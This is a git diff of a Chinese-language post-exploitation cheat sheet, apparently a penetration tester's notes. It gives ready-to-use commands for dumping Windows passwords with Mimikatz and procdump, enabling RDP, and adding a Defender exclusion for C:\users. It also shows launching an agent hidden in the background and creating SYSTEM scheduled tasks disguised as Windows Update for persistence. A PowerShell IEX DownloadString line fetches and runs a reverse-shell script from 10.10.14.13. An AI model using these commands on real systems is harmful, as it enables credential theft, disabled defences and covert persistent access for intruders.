@@ -580,9 +580,9 @@ casper
 ## 密码抓取
 ### Mimikatz抓Windows
 
-https://github.com/gentilkiwi/mimikatz/releases
-dump工具
-https://docs.microsoft.com/en-us/sysinternals/downloads/procdump
+https://github.com/gentilkiwi/mimikatz/releases     
+dump工具      
+https://docs.microsoft.com/en-us/sysinternals/downloads/procdump        
 
 一条命令
 ```
@@ -1297,6 +1297,7 @@ C:\inetpub\logs\LogFiles
 
 
 ## 开3389
+开Rdp
 ```
 方法一
 wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != "") call setallowtsconnections 1
@@ -1352,9 +1353,13 @@ echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.p
 ```
 
 ## Defender排除项
-Defender排除项
+
+Defender添加排除项，加白。
 ```
-powershell -ExecutionPolicy Bypass Add-MpPreference -ExclusionPath "C:\test"
+powershell -ExecutionPolicy Bypass Add-MpPreference -ExclusionPath "C:\users"
+
+查询排除项
+powershell -ExecutionPolicy Bypass (Get-MpPreference).ExclusionPath
 ```
 
 
@@ -1506,8 +1511,10 @@ RDP桌面下，隐藏窗口启动
 后台运行
 powershell -Command "Start-Process 'agent.exe' -WindowStyle Hidden"
 
-更隐蔽可以把exe后缀也改了，也能正常运行。
+带参数
+powershell -Command "Start-Process 'agent.exe' -ArgumentList 'xxx' -WindowStyle Hidden"
 
+更隐蔽可以把exe后缀也改了，也能正常运行。不过没什么卵用
 powershell -Command "Start-Process 'agent.xxx' -WindowStyle Hidden"
 ```
 
@@ -2103,6 +2110,13 @@ SCHTASKS /Create /RU SYSTEM /SC ONSTART /RL HIGHEST /TN \Microsoft\Windows\Updat
 
 晚上23：45执行
 SCHTASKS /Create /RU SYSTEM /RL HIGHEST /SC DAILY /TN \Microsoft\Windows\Update\task2 /TR "C:\programData\update.exe" /ST 23:45 /F
+
+
+查询
+SCHTASKS /query
+C:\\Windows\\System32\\schtasks.exe /query
+
+
 ```
 
 ### WMI事件
